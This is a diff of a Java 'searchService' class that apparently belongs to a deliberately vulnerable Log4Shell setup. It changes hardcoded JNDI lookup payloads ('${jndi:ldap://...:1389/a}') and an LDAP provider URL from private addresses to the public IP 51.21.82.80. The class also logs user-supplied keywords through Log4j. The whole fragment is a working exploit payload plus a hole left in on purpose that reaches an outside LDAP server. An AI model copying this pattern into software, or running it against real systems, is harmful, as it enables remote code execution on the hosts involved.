@@ -45,8 +45,8 @@ public class searchService {
         
         String log4jVersion = LogManager.getLogger(Logger.class).getClass().getPackage().getImplementationVersion();
         String keyword = key.getKeywords();
-        String userInput = "${jndi:ldap://192.168.14.17:1389/a}";
-        String jndiLookupString = "${jndi:ldap://192.168.14.28:1389/dc=example,dc=com}";
+        String userInput = "${jndi:ldap://51.21.82.80:1389/a}";
+        String jndiLookupString = "${jndi:ldap://51.21.82.80:1389/dc=example,dc=com}";
         
         
         logger.info(keyword);
@@ -56,7 +56,7 @@ public class searchService {
         
         Hashtable<String, String> env = new Hashtable<>();
         env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
-        env.put(Context.PROVIDER_URL, "ldap://192.168.14.28:1389/dc=example,dc=com");
+        env.put(Context.PROVIDER_URL, "ldap://51.21.82.80:1389/dc=example,dc=com");
 
         try {
             DirContext ctx = new InitialDirContext(env);
@@ -68,7 +68,7 @@ public class searchService {
         }
 
         //
-        String jndiPath = "ldap://192.168.14.28:1389/dc=example,dc=com";
+        String jndiPath = "ldap://51.21.82.80:1389/dc=example,dc=com";
         
         // 환경 설정
         Hashtable<String, String> env1 = new Hashtable<>();
